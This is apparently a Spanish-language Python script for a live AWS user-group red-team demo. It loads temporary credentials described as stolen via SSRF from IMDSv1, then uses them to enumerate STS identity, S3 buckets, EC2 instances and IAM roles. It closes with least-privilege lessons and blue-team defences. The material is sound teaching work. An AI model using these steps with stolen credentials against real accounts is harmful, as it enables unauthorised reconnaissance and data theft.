#!/usr/bin/env python3
"""
Paso 3 del Red Team: Movimiento Lateral y Reconocimiento usando credenciales robadas.
AWS User Group Minatitlan - Demo en Vivo.
"""
import sys
import os
import json
import subprocess

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

CREDS_FILE = "/tmp/redteam_stolen_creds.json"

def run_aws_command(env_vars, command_args):
    try:
        full_cmd = ["aws"] + command_args
        res = subprocess.run(full_cmd, env=env_vars, capture_output=True, text=True, check=True)
        return res.stdout.strip()
    except subprocess.CalledProcessError as e:
        return f"ERROR ({e.returncode}): {e.stderr.strip()}"

def main():
    print(f"\n{BOLD}{CYAN}=== [RED TEAM FASE 3] Movimiento Lateral con Credenciales Robadas ==={RESET}\n")
    print(f"{YELLOW}[*] Contexto tipico de ataque post-explotacion:{RESET}")
    print("    Una vez que el adversario extrae las credenciales temporales de IMDSv1,")
    print("    las inyecta en su entorno local para suplantar la identidad del servidor.")
    print("    Si el rol de IAM no sigue el principio de menor privilegio, el atacante")
    print("    puede enumerar buckets, instancias EC2 y mapear toda la cuenta.\n")

    if not os.path.exists(CREDS_FILE):
        print(f"{RED}[!] No se encontro el archivo de credenciales {CREDS_FILE}.{RESET}")
        print("    Ejecuta primero la Fase 2 (opcion 3) para robar las credenciales via SSRF.\n")
        sys.exit(1)

    with open(CREDS_FILE, "r") as f:
        creds = json.load(f)

    # Inyectar credenciales robadas en variables de entorno para AWS CLI
    stolen_env = os.environ.copy()
    stolen_env["AWS_ACCESS_KEY_ID"] = creds["AccessKeyId"]
    stolen_env["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
    stolen_env["AWS_SESSION_TOKEN"] = creds["Token"]
    if "AWS_DEFAULT_REGION" not in stolen_env and "AWS_REGION" not in stolen_env:
        stolen_env["AWS_DEFAULT_REGION"] = "us-east-1"

    print(f"{GREEN}[+] Credenciales temporales cargadas en la sesion del atacante:{RESET}")
    print(f"    AccessKeyId: {creds['AccessKeyId'][:8]}...{creds['AccessKeyId'][-4:]}")
    print(f"    Region:      {stolen_env['AWS_DEFAULT_REGION']}")

    # 1. Quien soy (STS Caller Identity)
    print(f"\n{BOLD}--- PASO 1: Confirmar identidad suplantada con AWS STS ---{RESET}")
    print(f"{YELLOW}[CMD] Comando que usa el atacante:{RESET}")
    print(f"\n    {BOLD}aws sts get-caller-identity{RESET}\n")
    caller_id = run_aws_command(stolen_env, ["sts", "get-caller-identity", "--output", "json"])
    for line in caller_id.split("\n"):
        print(f"    {CYAN}>> {line}{RESET}")

    # 2. Enumerar almacenamiento corporativo (S3)
    print(f"\n{BOLD}--- PASO 2: Enumerar almacenamiento corporativo en Amazon S3 ---{RESET}")
    print(f"{YELLOW}[CMD] Comando que usa el atacante:{RESET}")
    print(f"\n    {BOLD}aws s3 ls{RESET}\n")
    s3_output = run_aws_command(stolen_env, ["s3", "ls"])
    if s3_output:
        for line in s3_output.split("\n"):
            print(f"    {YELLOW}>> {line}{RESET}")
    else:
        print(f"    {RED}[!] Acceso denegado o sin buckets visibles.{RESET}")

    # 3. Enumerar computo (EC2) para mapear redes internas
    print(f"\n{BOLD}--- PASO 3: Mapear servidores e instancias EC2 en la cuenta ---{RESET}")
    print(f"{YELLOW}[CMD] Comando que usa el atacante:{RESET}")
    print(f"\n    {BOLD}aws ec2 describe-instances --query \"Reservations[*].Instances[*].[InstanceId,InstanceType,State.Name,PrivateIpAddress,PublicIpAddress]\" --output table{RESET}\n")
    ec2_output = run_aws_command(stolen_env, [
        "ec2", "describe-instances",
        "--query", "Reservations[*].Instances[*].[InstanceId,InstanceType,State.Name,PrivateIpAddress,PublicIpAddress]",
        "--output", "table"
    ])
    for line in ec2_output.split("\n"):
        print(f"    {CYAN}>> {line}{RESET}")

    # 4. Enumerar roles de IAM para buscar posibles caminos de escalada
    print(f"\n{BOLD}--- PASO 4: Listar roles IAM para buscar caminos de escalada ---{RESET}")
    print(f"{YELLOW}[CMD] Comando que usa el atacante:{RESET}")
    print(f"\n    {BOLD}aws iam list-roles --query \"Roles[*].[RoleName,CreateDate]\" --output table{RESET}\n")
    iam_roles = run_aws_command(stolen_env, [
        "iam", "list-roles",
        "--query", "Roles[*].[RoleName,CreateDate]",
        "--output", "table"
    ])
    for line in iam_roles.split("\n"):
        print(f"    {YELLOW}>> {line}{RESET}")

    print(f"\n{BOLD}{RED}[LECCION RED TEAM]:{RESET}")
    print("El rol de la instancia EC2 tenia politicas excesivas: 's3:*', 'ec2:Describe*' e 'iam:ListRoles'.")
    print("Un atacante externo ahora conoce la arquitectura interna completa de la empresa,")
    print("puede robar mas datos, o incluso planear escaladas de privilegios hacia cuentas de administración.")
    print("Principio critico violado: Menor Privilegio (Least Privilege).")

    print(f"\n{YELLOW}[DEFENSA BLUE TEAM]:{RESET}")
    print("1. Politicas de IAM estrictas: el servidor solo debe tener acceso al bucket especifico que requiere.")
    print("2. Restringir permisos de lectura sobre IAM y EC2 para roles de aplicaciones web.")
    print("3. Monitoreo activo con AWS GuardDuty ante llamadas de API inusuales desde IPs externas con tokens STS.\n")

if __name__ == "__main__":
    main()
